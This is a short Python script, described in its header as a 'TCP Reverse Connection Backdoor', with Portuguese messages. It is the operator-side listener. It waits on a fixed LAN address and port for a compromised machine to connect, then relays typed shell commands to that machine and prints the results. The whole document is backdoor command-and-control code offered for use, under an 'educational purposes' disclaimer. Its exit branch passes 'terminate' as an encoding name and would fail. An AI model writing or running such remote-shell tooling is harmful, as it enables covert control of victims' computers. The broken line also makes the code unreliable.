#Created for educational purposes by Carlos/cardangi
#I'm not responsible for illegal usage of it.
#TCP Reverse Connection Backdoor


import socket

def conectar():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.1.7", 8080)) # change the ip
    s.listen(1)

    print ("'[**] Ouvindo a porta 8080 no ip 192.168.1.7")
    conn, addr = s.accept()
    print ("[**] Conseguimos uma conexão de:", addr)

    while True:
        controle = input("CMD/SHELL > ")
        if 'terminate' in controle:
            conn.send (controle.encode('terminate'))
            conn.close()
            break
        else:
            conn.send (controle.encode())
            print (conn.recv(1024).decode("cp850"))

def comecaessaporra():
    conectar()
comecaessaporra()
